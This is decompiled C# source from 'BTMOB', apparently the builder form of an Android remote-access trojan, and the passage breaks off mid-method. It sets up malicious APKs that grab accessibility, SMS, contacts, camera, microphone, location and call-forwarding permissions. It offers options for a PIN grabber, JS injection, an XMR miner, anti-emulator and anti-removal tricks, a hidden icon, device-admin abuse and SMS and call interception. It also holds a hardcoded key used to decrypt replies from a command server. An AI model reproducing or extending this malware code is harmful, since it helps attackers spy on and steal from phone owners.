using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.WinForms;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class ApkMaker : basestyle
{
	[CompilerGenerated]
	private sealed class VB_0024StateMachine_1153_ApkMaker_Load : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal ApkMaker _0024VB_0024Me;

		internal DataGridView _0024W0;

		internal int _0024VB_0024ResumableLocal_rowindexstng_00241;

		internal int _0024VB_0024ResumableLocal_rowindexacnts_00242;

		internal IEnumerator _0024S3;

		internal DataGridViewColumn _0024VB_0024ResumableLocal_col_00244;

		internal IEnumerator _0024S5;

		internal DataGridViewRow _0024VB_0024ResumableLocal_ro_00246;

		internal string[] _0024VB_0024ResumableLocal_items_00247;

		internal int _0024VB_0024ResumableLocal_idx_00248;

		internal Exception _0024VB_0024ResumableLocal_ex_00249;

		internal string _0024VB_0024ResumableLocal_raw_002410;

		internal string[] _0024S11;

		internal int _0024S12;

		internal string _0024VB_0024ResumableLocal_host_002413;

		internal Exception _0024VB_0024ResumableLocal_ex_002414;

		internal string _0024VB_0024ResumableLocal_raw_002415;

		internal string[] _0024S16;

		internal int _0024S17;

		internal string _0024VB_0024ResumableLocal_encodedData_002418;

		internal string _0024VB_0024ResumableLocal_decoded_002419;

		internal string[] _0024VB_0024ResumableLocal_parts_002420;

		internal string _0024VB_0024ResumableLocal_thename_002421;

		internal string _0024VB_0024ResumableLocal_thelink_002422;

		internal string _0024VB_0024ResumableLocal_theid_002423;

		internal string _0024VB_0024ResumableLocal_tracktype_002424;

		internal string _0024VB_0024ResumableLocal_targetText_002425;

		internal string _0024VB_0024ResumableLocal_display_002426;

		internal Exception _0024VB_0024ResumableLocal_ex_002427;

		internal Dictionary<Control, string>.Enumerator _0024S28;

		internal KeyValuePair<Control, string> _0024VB_0024ResumableLocal_item_002429;

		internal List<string>.Enumerator _0024S30;

		internal string _0024VB_0024ResumableLocal_apptag_002431;

		internal int _0024VB_0024ResumableLocal_index_002432;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			checked
			{
				try
				{
					TaskAwaiter awaiter;
					if (num != 0)
					{
						awaiter = _0024VB_0024Me.accssview.EnsureCoreWebView2Async().GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = (_0024State = 0);
							_0024A0 = awaiter;
							ref AsyncVoidMethodBuilder reference = ref _0024Builder;
							VB_0024StateMachine_1153_ApkMaker_Load stateMachine = this;
							reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
							return;
						}
					}
					else
					{
						num = (_0024State = -1);
						awaiter = _0024A0;
						_0024A0 = default(TaskAwaiter);
					}
					awaiter.GetResult();
					awaiter = default(TaskAwaiter);
					_0024VB_0024Me.accssview.NavigateToString(Resources.static_accesspage);
					_0024VB_0024Me.loadsteps();
					_0024VB_0024Me.accssview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
					_0024VB_0024Me.accssview.CoreWebView2.Settings.AreDevToolsEnabled = false;
					_0024VB_0024Me.maintabs.ItemSize = new Size(1, 1);
					_0024VB_0024Me.maintabs.SizeMode = TabSizeMode.Fixed;
					_0024VB_0024Me.mytitle.Text = $"{_0024VB_0024Me.currentStepIndex + 1}/{_0024VB_0024Me.maintabs.TabPages.Count} | {RuntimeHelpers.GetObjectValue(_0024VB_0024Me.maintabs.TabPages[_0024VB_0024Me.currentStepIndex].Tag)}";
					_0024VB_0024Me.listhosts.Items.Add(_0024VB_0024Me.serverip);
					codes.SetDoubleBuffered(_0024VB_0024Me.DGVPRIMB);
					_0024W0 = _0024VB_0024Me.DGVPRIMB;
					_0024W0.EnableHeadersVisualStyles = false;
					_0024W0.CellBorderStyle = DataGridViewCellBorderStyle.None;
					_0024W0.RowHeadersVisible = false;
					_0024W0.GridColor = Color.FromArgb(6, 10, 15);
					_0024W0.BackgroundColor = Color.FromArgb(6, 10, 15);
					_0024W0.ForeColor = Color.White;
					_0024W0.DefaultCellStyle.BackColor = Color.FromArgb(6, 10, 15);
					_0024W0.DefaultCellStyle.SelectionBackColor = Color.FromArgb(14, 22, 33);
					_0024W0 = null;
					_0024VB_0024Me.deficon = (Bitmap)codes.ResizeImage(Resources.block_con, new Size(16, 16));
					_0024VB_0024Me.deficon_ok = (Bitmap)codes.ResizeImage(Resources.ok_con, new Size(16, 16));
					_0024VB_0024Me.deficon_ok_one = (Bitmap)codes.ResizeImage(Resources.one_ok_con, new Size(16, 16));
					_0024VB_0024Me.DGVPRIMB.Rows.Clear();
					_0024VB_0024Me.DGVPRIMB.Rows.Add("1", BTConst.accserstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("2", BTConst.usgapstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("3", BTConst.draovrstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024ResumableLocal_rowindexstng_00241 = _0024VB_0024Me.DGVPRIMB.Rows.Add("4", BTConst.chngstnstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows[_0024VB_0024ResumableLocal_rowindexstng_00241].ReadOnly = true;
					_0024VB_0024Me.DGVPRIMB.Rows[_0024VB_0024ResumableLocal_rowindexstng_00241].Visible = false;
					_0024VB_0024Me.DGVPRIMB.Rows.Add("5", BTConst.btryopimstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("6", BTConst.backdatastr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("7", BTConst.filaccstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("8", BTConst.camaccstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("9", BTConst.micaccstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("10", BTConst.redsmsstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("11", BTConst.sndsmstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("12", BTConst.redconstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024ResumableLocal_rowindexacnts_00242 = _0024VB_0024Me.DGVPRIMB.Rows.Add("13", BTConst.redactstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows[_0024VB_0024ResumableLocal_rowindexacnts_00242].ReadOnly = true;
					_0024VB_0024Me.DGVPRIMB.Rows[_0024VB_0024ResumableLocal_rowindexacnts_00242].Visible = false;
					_0024VB_0024Me.DGVPRIMB.Rows.Add("14", BTConst.noftsstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("15", BTConst.loctionstr, "Remove", false, _0024VB_0024Me.deficon);
					_0024VB_0024Me.DGVPRIMB.Rows.Add("16", BTConst.callfordstr, "Remove", false, _0024VB_0024Me.deficon);
					try
					{
						_0024S3 = _0024VB_0024Me.DGVPRIMB.Columns.GetEnumerator();
						while (_0024S3.MoveNext())
						{
							_0024VB_0024ResumableLocal_col_00244 = (DataGridViewColumn)_0024S3.Current;
							_0024VB_0024ResumableLocal_col_00244.SortMode = DataGridViewColumnSortMode.NotSortable;
							_0024VB_0024ResumableLocal_col_00244.DefaultCellStyle.Padding = new Padding(0, 5, 0, 5);
							if (_0024VB_0024ResumableLocal_col_00244.Index >= 3)
							{
								_0024VB_0024ResumableLocal_col_00244.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
							}
						}
					}
					finally
					{
						if (num < 0 && _0024S3 is IDisposable)
						{
							(_0024S3 as IDisposable).Dispose();
						}
					}
					try
					{
						_0024S5 = ((IEnumerable)_0024VB_0024Me.DGVPRIMB.Rows).GetEnumerator();
						while (_0024S5.MoveNext())
						{
							_0024VB_0024ResumableLocal_ro_00246 = (DataGridViewRow)_0024S5.Current;
							_0024VB_0024ResumableLocal_ro_00246.Cells[3].ReadOnly = true;
							_0024VB_0024ResumableLocal_ro_00246.Cells[3].Style.Alignment = DataGridViewContentAlignment.MiddleCenter;
							_0024VB_0024ResumableLocal_ro_00246.Cells[4].Style.Alignment = DataGridViewContentAlignment.MiddleCenter;
						}
					}
					finally
					{
						if (num < 0 && _0024S5 is IDisposable)
						{
							(_0024S5 as IDisposable).Dispose();
						}
					}
					if (!string.IsNullOrEmpty(MySettingsProperty.Settings.HiddenList))
					{
						_0024VB_0024ResumableLocal_items_00247 = MySettingsProperty.Settings.HiddenList.Split('|');
						_0024VB_0024Me.Listhides.Items.Clear();
						_0024VB_0024Me.Listhides.Items.AddRange(_0024VB_0024ResumableLocal_items_00247);
					}
					_0024VB_0024Me.checkpump.Checked = MySettingsProperty.Settings.checkpump;
					try
					{
						_0024VB_0024Me.checknosleep.Checked = MySettingsProperty.Settings.checknosleep;
						_0024VB_0024Me.checknoemu.Checked = MySettingsProperty.Settings.checknoemu;
						_0024VB_0024Me.checkantistop.Checked = MySettingsProperty.Settings.checkantistop;
						_0024VB_0024Me.checkforceprims.Checked = MySettingsProperty.Settings.checkforceprims;
						_0024VB_0024Me.blocksms.Checked = MySettingsProperty.Settings.blocksms;
						_0024VB_0024Me.blockcalls.Checked = MySettingsProperty.Settings.blockcalls;
						_0024VB_0024Me.Devadmincheck.Checked = MySettingsProperty.Settings.Devadmincheck;
						_0024VB_0024Me.rootcheck.Checked = MySettingsProperty.Settings.rootcheck;
						_0024VB_0024Me.checkxmr.Checked = MySettingsProperty.Settings.checkxmr;
						_0024VB_0024Me.checkffmpg.Checked = MySettingsProperty.Settings.checkffmpg;
						_0024VB_0024Me.checknotykill.Checked = MySettingsProperty.Settings.checknotykill;
						_0024VB_0024Me.checkantidelete.Checked = MySettingsProperty.Settings.checkantidelete;
						_0024VB_0024Me.checkautoprims.Checked = MySettingsProperty.Settings.checkautoprims;
						_0024VB_0024Me.checkhidprim.Checked = MySettingsProperty.Settings.checkhidprim;
						_0024VB_0024Me.checkcaplock.Checked = MySettingsProperty.Settings.checkcaplock;
						_0024VB_0024Me.checkdisstore.Checked = MySettingsProperty.Settings.checkdisstore;
						_0024VB_0024ResumableLocal_idx_00248 = _0024VB_0024Me.hideicocombox.Items.IndexOf(MySettingsProperty.Settings.Hicocombo);
						if (_0024VB_0024ResumableLocal_idx_00248 >= 0)
						{
							_0024VB_0024Me.hideicocombox.SelectedIndex = _0024VB_0024ResumableLocal_idx_00248;
						}
						_0024VB_0024Me.listshortcuts.Enabled = _0024VB_0024Me.hideicocombox.SelectedIndex == 3;
						_0024VB_0024Me.checkfakewifi.Enabled = _0024VB_0024Me.hideicocombox.SelectedIndex == 1;
						_0024VB_0024Me.checkfakewifi.Visible = _0024VB_0024Me.hideicocombox.SelectedIndex == 1;
						_0024VB_0024Me.checkfakewifi.Checked = _0024VB_0024Me.hideicocombox.SelectedIndex == 1;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_00249 = ex2;
						ProjectData.ClearProjectError();
					}
					try
					{
						_0024VB_0024ResumableLocal_raw_002410 = MySettingsProperty.Settings.listhosts_data;
						if (!string.IsNullOrWhiteSpace(_0024VB_0024ResumableLocal_raw_002410))
						{
							_0024S11 = _0024VB_0024ResumableLocal_raw_002410.Split(new string[1] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
							for (_0024S12 = 0; _0024S12 < _0024S11.Length; _0024S12++)
							{
								_0024VB_0024ResumableLocal_host_002413 = _0024S11[_0024S12];
								if (!_0024VB_0024Me.listhosts.Items.Contains(_0024VB_0024ResumableLocal_host_002413))
								{
									_0024VB_0024Me.listhosts.Items.Add(_0024VB_0024ResumableLocal_host_002413);
								}
							}
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						_0024VB_0024ResumableLocal_ex_002414 = ex4;
						ProjectData.ClearProjectError();
					}
					try
					{
						_0024VB_0024ResumableLocal_raw_002415 = MySettingsProperty.Settings.traklist_data;
						if (!string.IsNullOrWhiteSpace(_0024VB_0024ResumableLocal_raw_002415))
						{
							_0024S16 = _0024VB_0024ResumableLocal_raw_002415.Split(new string[1] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
							for (_0024S17 = 0; _0024S17 < _0024S16.Length; _0024S17++)
							{
								_0024VB_0024ResumableLocal_encodedData_002418 = _0024S16[_0024S17];
								_0024VB_0024ResumableLocal_decoded_002419 = Encoding.UTF8.GetString(Convert.FromBase64String(_0024VB_0024ResumableLocal_encodedData_002418));
								_0024VB_0024ResumableLocal_parts_002420 = _0024VB_0024ResumableLocal_decoded_002419.Split(new string[1] { "[<s>]" }, StringSplitOptions.None);
								if (_0024VB_0024ResumableLocal_parts_002420.Length >= 4)
								{
									_0024VB_0024ResumableLocal_thename_002421 = _0024VB_0024ResumableLocal_parts_002420[0];
									_0024VB_0024ResumableLocal_thelink_002422 = _0024VB_0024ResumableLocal_parts_002420[1];
									_0024VB_0024ResumableLocal_theid_002423 = _0024VB_0024ResumableLocal_parts_002420[2];
									_0024VB_0024ResumableLocal_tracktype_002424 = _0024VB_0024ResumableLocal_parts_002420[3];
									_0024VB_0024ResumableLocal_targetText_002425 = ((Operators.CompareString(_0024VB_0024ResumableLocal_tracktype_002424, "G", TextCompare: false) == 0) ? "Pin Grabber" : "T");
									_0024VB_0024ResumableLocal_display_002426 = $"{_0024VB_0024ResumableLocal_thename_002421}: {_0024VB_0024ResumableLocal_targetText_002425}";
									_0024VB_0024Me.traklist.Items.Add(new ListItem(_0024VB_0024ResumableLocal_display_002426, _0024VB_0024ResumableLocal_encodedData_002418));
								}
							}
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						_0024VB_0024ResumableLocal_ex_002427 = ex6;
						ProjectData.ClearProjectError();
					}
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkstore, BTConst.tipcheckstore);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.labelname, BTConst.tipclientname);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checknosleep, BTConst.tipnosleep);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checknoemu, BTConst.tipnoemu);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkantistop, BTConst.tipnokill);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkcaplock, BTConst.tipcaplock);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.hideicocombox, BTConst.tiphideico);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkantidelete, BTConst.tipnodelete);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.inputhost, BTConst.tipaddhost);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkdisstore, BTConst.tipdisstore);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkhidprim, BTConst.tiphidprim);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkjctjs, BTConst.tipjectjs);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkonejs, BTConst.tipjectjsonce);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkforceprims, BTConst.tipforcprims);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.clitag, BTConst.tagtipstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.ListTags, BTConst.tagtipstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.hidaccsstitle, BTConst.hidaccsstipstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkpump, BTConst.pumptipstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkprotect, BTConst.protectappstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.btnstyleM, BTConst.mobstylestr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.btnstyleD, BTConst.dsktopstylstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.blocksms, BTConst.interptsmsstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.blockcalls, BTConst.interptcallsstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.combodroptype, BTConst.dropcombstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.encryptmain, BTConst.enapkinfstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkforcbypass, BTConst.forcbypassinfdostr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.Devadmincheck, BTConst.devadmnexpstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.rootcheck, BTConst.rootdexpstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkxmr, BTConst.xmrmnrexpstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkffmpg, BTConst.ffmgexpstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkdexp, BTConst.dexptipstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.admlabelpass, BTConst.admpassdisstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.adminpass, BTConst.nopassstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkhidnotify, BTConst.hidnotfytipstr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.traklist, BTConst.trakgrabtip);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.comboTargts, BTConst.trakgrabtip);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.Label3, BTConst.trakgrabtip);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkreplcply, BTConst.replcplyinfostr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkNoservice, BTConst.srvnavlblinfostr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkfakewifi, BTConst.fakwifiinfostr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkreqadmin, BTConst.reqadmninfostr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkaccsspage, $"{BTConst.autostr}: {BTConst.autoaccssstr}" + "\r\n" + $"{BTConst.statcstr}: {BTConst.statcaccssstr}");
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.lblaccsspage, $"{BTConst.autostr}: {BTConst.autoaccssstr}" + "\r\n" + $"{BTConst.statcstr}: {BTConst.statcaccssstr}");
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checkcustmsign, BTConst.cstmsugninfostr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.DGVKEYS, BTConst.slctkystr);
					_0024VB_0024Me.tips.Add(_0024VB_0024Me.checknotykill, BTConst.antinotytipstr);
					try
					{
						_0024S28 = _0024VB_0024Me.tips.GetEnumerator();
						while (_0024S28.MoveNext())
						{
							_0024VB_0024ResumableLocal_item_002429 = _0024S28.Current;
							_0024VB_0024ResumableLocal_item_002429.Key.MouseHover += _0024VB_0024Me.Control_MouseHover;
							_0024VB_0024ResumableLocal_item_002429.Key.MouseLeave += _0024VB_0024Me.Control_MouseLeave;
						}
					}
					finally
					{
						if (num < 0)
						{
							((IDisposable)_0024S28/*cast due to .constrained prefix*/).Dispose();
						}
					}
					_0024VB_0024Me.TagsManager = new TagsManager();
					try
					{
						_0024S30 = _0024VB_0024Me.TagsManager.GetTags().GetEnumerator();
						while (_0024S30.MoveNext())
						{
							_0024VB_0024ResumableLocal_apptag_002431 = _0024S30.Current;
							_0024VB_0024Me.ListTags.Items.Add(_0024VB_0024ResumableLocal_apptag_002431);
						}
					}
					finally
					{
						if (num < 0)
						{
							((IDisposable)_0024S30/*cast due to .constrained prefix*/).Dispose();
						}
					}
					_0024VB_0024Me.translateme();
					_0024VB_0024Me.Tablogin.Enabled = false;
					if (!codes.StrisEmpty(MySettingsProperty.Settings.CLiname))
					{
						_0024VB_0024Me.CLiname.Text = MySettingsProperty.Settings.CLiname;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.appname))
					{
						_0024VB_0024Me.appname.Text = MySettingsProperty.Settings.appname;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.dropname))
					{
						_0024VB_0024Me.dropname.Text = MySettingsProperty.Settings.dropname;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.applink))
					{
						_0024VB_0024Me.applink.Text = MySettingsProperty.Settings.applink;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.titletext))
					{
						_0024VB_0024Me.titletext.Text = MySettingsProperty.Settings.titletext;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.msgtext))
					{
						_0024VB_0024Me.msgtext.Text = MySettingsProperty.Settings.msgtext;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.langtext) && _0024VB_0024Me.langtext.Items.Contains(MySettingsProperty.Settings.langtext))
					{
						_0024VB_0024Me.langtext.SelectedItem = MySettingsProperty.Settings.langtext;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.Acctitletext))
					{
						_0024VB_0024Me.Acctitletext.Text = MySettingsProperty.Settings.Acctitletext;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.Accmsgtext))
					{
						_0024VB_0024Me.Accmsgtext.Text = MySettingsProperty.Settings.Accmsgtext;
					}
					if (!codes.StrisEmpty(MySettingsProperty.Settings.Accbtntext))
					{
						_0024VB_0024Me.Accbtntext.Text = MySettingsProperty.Settings.Accbtntext;
					}
					_0024VB_0024ResumableLocal_index_002432 = 1;
					do
					{
						_0024VB_0024Me.randver_Click(null, null);
						_0024VB_0024Me.randids_Click(null, null);
						_0024VB_0024Me.rand_dropver(null, null);
						_0024VB_0024Me.rand_dropid(null, null);
						_0024VB_0024ResumableLocal_index_002432++;
					}
					while (_0024VB_0024ResumableLocal_index_002432 <= 2);
					_0024VB_0024Me.jectjstext.ReadOnly = true;
					_0024VB_0024Me.jectjstext.Text = "//Example:\r\n\r\nif(confirm('Join telegram channel')){\r\n    window.open('https://t.me/test','_blank');\r\n}";
					_0024VB_0024Me.Label6.Text = BTConst.conkeystr;
					_0024VB_0024Me.IamAlive = true;
					_0024VB_0024Me.loadstorework.RunWorkerAsync();
					_0024VB_0024Me.iconsloader.RunWorkerAsync();
					_0024VB_0024Me.Keysloader.RunWorkerAsync();
					_0024VB_0024Me.LoadDGVState();
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception exception = ex7;
					_0024State = -2;
					_0024Builder.SetException(exception);
					ProjectData.ClearProjectError();
					return;
				}
				num = (_0024State = -2);
				_0024Builder.SetResult();
			}
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_1157_loadstorework_DoWork : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal DoWorkEventArgs _0024VB_0024Local_e;

		internal ApkMaker _0024VB_0024Me;

		internal _Closure_0024__1157_002D1 _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;

		internal string _0024VB_0024ResumableLocal_Randomkey_00241;

		internal VB_0024AnonymousType_2<string, string, string> _0024VB_0024ResumableLocal_params_00242;

		internal string _0024VB_0024ResumableLocal_response_00243;

		internal string _0024VB_0024ResumableLocal_datajson_00244;

		internal Exception _0024VB_0024ResumableLocal_ex_00245;

		internal _Closure_0024__1157_002D0 _0024VB_0024ResumableLocal__0024VB_0024Closure__00246;

		internal JArray _0024VB_0024ResumableLocal_jsonArray_00247;

		internal IEnumerator<JToken> _0024S8;

		internal JObject _0024VB_0024ResumableLocal_row_00249;

		internal string _0024VB_0024ResumableLocal_app_id_002410;

		internal string _0024VB_0024ResumableLocal_app_name_002411;

		internal string _0024VB_0024ResumableLocal_app_size_002412;

		internal string _0024VB_0024ResumableLocal_app_date_002413;

		internal string _0024VB_0024ResumableLocal_app_folder_002414;

		internal string _0024VB_0024ResumableLocal_app_version_002415;

		internal string _0024VB_0024ResumableLocal_app_ico_002416;

		internal string _0024VB_0024ResumableLocal_build_state_002417;

		internal Bitmap _0024VB_0024ResumableLocal_appicon_002418;

		internal Bitmap _0024VB_0024ResumableLocal_cached_002419;

		internal string _0024VB_0024ResumableLocal_fullUrl_002420;

		internal Bitmap _0024VB_0024ResumableLocal_downloaded_002421;

		internal Exception _0024VB_0024ResumableLocal_ex_002422;

		internal Exception _0024VB_0024ResumableLocal_ex_002423;

		internal TaskAwaiter<(bool, object)> _0024A0;

		internal _Closure_0024__1157_002D1 _0024U1;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if (num != -3 && num != 0)
				{
					goto IL_0883;
				}
				goto IL_003a;
				IL_003a:
				try
				{
					TaskAwaiter<(bool, object)> awaiter;
					switch (num)
					{
					case -3:
						num = (_0024State = -1);
						return;
					default:
						_0024VB_0024ResumableLocal__0024VB_0024Closure__00240 = new _Closure_0024__1157_002D1(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240);
						_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Me = _0024VB_0024Me;
						_0024VB_0024ResumableLocal_Randomkey_00241 = codes.StrGenerator(32);
						_0024VB_0024ResumableLocal_params_00242 = new VB_0024AnonymousType_2<string, string, string>("load", _0024VB_0024ResumableLocal_Randomkey_00241, _0024VB_0024Me.nextkey);
						_0024U1 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
						awaiter = MyServer.FetchStore(_0024VB_0024ResumableLocal_params_00242, _0024VB_0024Me.httpClient, _0024VB_0024Me.serverip).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = (_0024State = 0);
							_0024A0 = awaiter;
							ref AsyncVoidMethodBuilder reference = ref _0024Builder;
							VB_0024StateMachine_1157_loadstorework_DoWork stateMachine = this;
							reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
							return;
						}
						break;
					case 0:
						num = (_0024State = -1);
						awaiter = _0024A0;
						_0024A0 = default(TaskAwaiter<(bool, object)>);
						break;
					}
					_Closure_0024__1157_002D1 closure_0024__1157_002D = _0024U1;
					(bool, object) result = awaiter.GetResult();
					awaiter = default(TaskAwaiter<(bool, object)>);
					closure_0024__1157_002D._0024VB_0024Local_result = result;
					_0024U1 = null;
					if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item1)
					{
						_0024VB_0024ResumableLocal_response_00243 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item2, null, "Replace", new object[2] { "\\", "" }, null, null, null), null, "Trim", new object[1] { "\"" }, null, null, null)));
						_0024VB_0024ResumableLocal_datajson_00244 = null;
						try
						{
							_0024VB_0024ResumableLocal_datajson_00244 = MyServer.DecryptReply(_0024VB_0024ResumableLocal_Randomkey_00241, "BT-MOB!B6twG9+&U", _0024VB_0024ResumableLocal_response_00243);
							Console.WriteLine("Store Data Response: " + _0024VB_0024ResumableLocal_datajson_00244);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							_0024VB_0024ResumableLocal_ex_00245 = ex2;
							_0024VB_0024ResumableLocal_datajson_00244 = null;
							ProjectData.ClearProjectError();
						}
						if (!codes.StrisEmpty(_0024VB_0024ResumableLocal_datajson_00244) && _0024VB_0024ResumableLocal_datajson_00244.StartsWith("[") && _0024VB_0024ResumableLocal_datajson_00244.EndsWith("]"))
						{
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00246 = new _Closure_0024__1157_002D0(_0024VB_0024ResumableLocal__0024VB_0024Closure__00246);
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024NonLocal__0024VB_0024Closure_2 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
							_0024VB_0024ResumableLocal_jsonArray_00247 = JArray.Parse(_0024VB_0024ResumableLocal_datajson_00244);
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00246._0024VB_0024Local_rowsToAdd = new List<Tuple<Bitmap, string, string, string, string, string, string>>();
							try
							{
								_0024S8 = _0024VB_0024ResumableLocal_jsonArray_00247.GetEnumerator();
								while (_0024S8.MoveNext())
								{
									_0024VB_0024ResumableLocal_row_00249 = (JObject)_0024S8.Current;
									_0024VB_0024ResumableLocal_app_id_002410 = _0024VB_0024ResumableLocal_row_00249["app_id"].ToString();
									_0024VB_0024ResumableLocal_app_name_002411 = _0024VB_0024ResumableLocal_row_00249["app_name"]?.ToString() ?? "";
									_0024VB_0024ResumableLocal_app_size_002412 = _0024VB_0024ResumableLocal_row_00249["app_size"]?.ToString() ?? "";
									_0024VB_0024ResumableLocal_app_date_002413 = _0024VB_0024ResumableLocal_row_00249["app_date"]?.ToString() ?? "";
